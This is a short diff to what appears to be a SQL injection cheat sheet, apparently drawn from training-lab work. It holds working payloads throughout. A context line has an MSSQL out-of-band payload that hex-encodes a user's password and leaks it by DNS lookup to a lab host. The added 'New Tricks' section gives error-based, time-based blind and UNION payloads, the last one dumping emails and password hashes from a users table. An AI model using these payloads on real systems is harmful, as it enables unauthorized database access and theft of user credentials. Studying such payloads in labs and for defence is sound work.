@@ -97,3 +97,17 @@ SELECT 1234 = 1234 is whatever you are targeting
 ```sql
 ';DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) from users WHERE username='maria'; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
 ```
+
+## New Tricks
+
+### Trick 1
+- Scenario: Error-based SQLi leaked DB version from product parameter.
+- Payload: `id=1' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -`
+
+### Trick 2
+- Scenario: Time-based blind SQLi confirmed injection behind generic response.
+- Payload: `id=1' AND IF(SUBSTRING(database(),1,1)='p',SLEEP(5),0)-- -`
+
+### Trick 3
+- Scenario: UNION SQLi exfiltrated email hashes from users table.
+- Payload: `id=-1 UNION SELECT 1,group_concat(email,0x3a,password),3 FROM users-- -`
